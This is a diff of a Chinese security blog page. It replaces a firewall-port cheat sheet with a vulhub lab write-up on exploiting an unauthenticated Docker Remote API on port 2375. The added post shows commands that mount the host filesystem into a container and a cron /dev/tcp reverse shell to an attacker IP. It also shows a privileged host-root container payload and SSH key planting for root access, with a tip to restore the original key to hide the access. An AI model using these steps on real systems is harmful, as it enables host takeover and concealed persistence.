@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="端口那些事, l0odrd的博客">
+    <meta name="keywords" content="docker remote api未授权访问, l0odrd的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>端口那些事 | l0odrd的博客</title>
+    <title>docker remote api未授权访问 | l0odrd的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -244,12 +244,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">端口那些事</h1>
+                    <h1 class="description center-align post-title">docker remote api未授权访问</h1>
                 </div>
             </div>
         </div>
@@ -363,9 +363,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/docker/">
+                                <span class="chip bg-color">docker</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -377,28 +381,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-28
+                    2021-12-08
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-19
+                    2021-12-08
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    273
+                    761
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -418,33 +422,75 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>想要开放端口，要先去了解防火墙状态和网络命令</p>
-<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
-<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
-<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
-<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
-<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
-<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
-<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
-<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
-<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
-<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
-<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
-<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
-<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
-<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
-<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
-<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
-<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
-<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
-<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
-<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
-<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
-<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
-<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
-<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
+                <h2 id="Docker-Remote-API-未授权访问"><a href="#Docker-Remote-API-未授权访问" class="headerlink" title="Docker Remote API 未授权访问"></a>Docker Remote API 未授权访问</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>docker swarm是管理docker集群的工具，主从管理默认通过端口2375通信</p>
+<blockquote>
+<p>与docker compose的区别就是docker compose管理的是单台主机上的多个容器，swarm是用来管理多台主机的容器集群服务</p>
+</blockquote>
+<p>当绑定在0.0.0.0上，未进行访问控制管理时会导致未授权访问</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h3><p>靶机：vulhub中docker未授权环境</p>
+<p>攻击者：docker&amp;docker-compose</p>
+<p>先访问2375端口看是否有<code>page not found</code>回显，有则说明存在未授权</p>
+<p><img src="https://s2.loli.net/2021/12/08/JqfCcUtyWFkmDo5.png" alt="image-20211207151316992"></p>
+<p><img src="https://s2.loli.net/2021/12/08/lA5uNBFCek9QRhH.png" alt="image-20211207151404268"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>列出靶机的镜像和容器</p>
+<p><code>docker -H tcp://靶机:2375 images</code></p>
+<blockquote>
+<p>这里的镜像是开启的环境中的镜像</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2021/12/08/VRi4OefbL5qkFut.png" alt="image-20211207160124760"></p>
+<p>将宿主机的根目录挂载到镜像id为c059bfaa849c的/mnt目录下</p>
+<p><code>docker -H tcp://靶机:2375 run -it -v /:/mnt 镜像id sh</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/QLwq3DyY5GBUgsX.png" alt="image-20211207160516702"></p>
+<p>直接反弹shell&amp;定时任务反弹shell</p>
+<p><code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/F6MD29f7tgGAvPp.png" alt="image-20211207164406870"></p>
+<p>已经确认防火墙关闭并且端口开放，但是仍然反弹不了</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1 </code></p>
+<p>而通过宿主机直接反弹shell没有问题，再次确认了端口和防火墙没有问题</p>
+<p><img src="https://s2.loli.net/2021/12/08/KXk5QFBDY6H41Jf.png" alt="image-20211207164928079"></p>
+<p>卡住了。</p>
+<p>在h0ld1rs大佬的指点下了解到了linux下的==<strong>shell种类</strong>==：</p>
+<p>使⽤docker搭建的环境进入容器内部时没有bash只能以sh进⼊</p>
+<blockquote>
+<p>sh、csh、tcsh、ash、bash</p>
+<p>还有一些其他的shell</p>
+<p>csh，Bill Joy大神写的，语法类似于C语言</p>
+<p>tcsh，csh的增强版，FreeBSD中的默认Shell</p>
+<p>ksh，AIX中的默认Shell</p>
+<p>dash，新版本Debian/Ubuntu的默认Shell</p>
+</blockquote>
+<p>简单来说，bash是linux中默认shell，sh是Unix中的标准shell，bash兼容sh（sh编写的shell代码可以直接在bash中使用）</p>
+<h4 id="查看linux中可用shell"><a href="#查看linux中可用shell" class="headerlink" title="查看linux中可用shell"></a>查看linux中可用shell</h4><p><code>cat /etc/shells</code></p>
+<p><img src="https://s2.loli.net/2021/12/08/lLUFGy1D3uBTEeA.png" alt="image-20211208143514687"></p>
+<h5 id="使用sh反弹shell"><a href="#使用sh反弹shell" class="headerlink" title="使用sh反弹shell"></a>使用sh反弹shell</h5><p>未成功</p>
+<blockquote>
+<p>这里回滚了一下服务器开启靶场后没有镜像了，直接使用rce的payload</p>
+</blockquote>
+<p>直接rce的payload</p>
+<p><code>docker -H ip:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</code></p>
+<h4 id="公私钥提权"><a href="#公私钥提权" class="headerlink" title="公私钥提权"></a>公私钥提权</h4><p>攻击者生成一对公私钥</p>
+<p><code> ssh-keygen -t rsa</code></p>
+<p>输入密钥名和密码</p>
+<p><img src="https://s2.loli.net/2021/12/08/xQs1WODUdo7pvXz.png" alt="image-20211208161713009"></p>
+<p>写入位于<code>/root/.ssh</code>目录下的公钥文件</p>
+<p><img src="https://s2.loli.net/2021/12/08/kXoQTfMKxCIYgLq.png" alt="image-20211208161522638"></p>
+<p>使用私钥登录</p>
+<p><code>ssh -i 私钥文件 root@公钥文件所在ip</code></p>
+<p>ps:</p>
+<p>这里可以先保存下对方原来的公钥，等利用公私钥登录权限维持后再给对方换回去，以隐匿操作</p>
+<h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><h3 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h3><ul>
+<li>docker中进入的容器有一部分使用的是sh的shell</li>
+<li>反弹shell先要在vps上开启监听</li>
+<li>挂载之后也没有找到root/.ssh目录下的公钥文件</li>
+</ul>
+<h3 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h3><ul>
+<li>禁止出站ip（只允许访问特定ip）</li>
+<li>禁止出站端口（只允许访问特定端口）</li>
+<li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
+<li>反弹命令不存在或是当前用户无权调用bash</li>
+<li>可能不是使用的bash、而是sh或其他</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/109216506">docker逃逸的几种方法以及其原理</a></p>
 
                 
             </div>
@@ -471,7 +517,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://King10280.github.io/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/">https://King10280.github.io/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</a>
+                    <a href="https://King10280.github.io/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">https://King10280.github.io/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -508,7 +554,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/docker/">
+                                    <span class="chip bg-color">docker</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -552,17 +602,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/07/05/web%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                <a href="/2021/12/08/docker-remote-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="web基础学习">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="docker remote api未授权访问">
                         
-                        <span class="card-title">web基础学习</span>
+                        <span class="card-title">docker remote api未授权访问</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -572,9 +623,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -582,6 +633,15 @@
                             
                         </span>
                     </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -593,13 +653,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/28/redis-4-unacc/">
+                <a href="/2021/12/07/docker%E9%80%83%E9%80%B8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="redis 4-unacc">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="docker逃逸">
                         
-                        <span class="card-title">redis 4-unacc</span>
+                        <span class="card-title">docker逃逸</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -610,16 +670,12 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-07
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/vulhub/" class="post-category">
-                                    vulhub
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            l0odrd
                             
                         </span>
                     </div>
@@ -627,8 +683,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/redis/">
-                        <span class="chip bg-color">redis</span>
+                    <a href="/tags/docker/">
+                        <span class="chip bg-color">docker</span>
                     </a>
                     
                 </div>
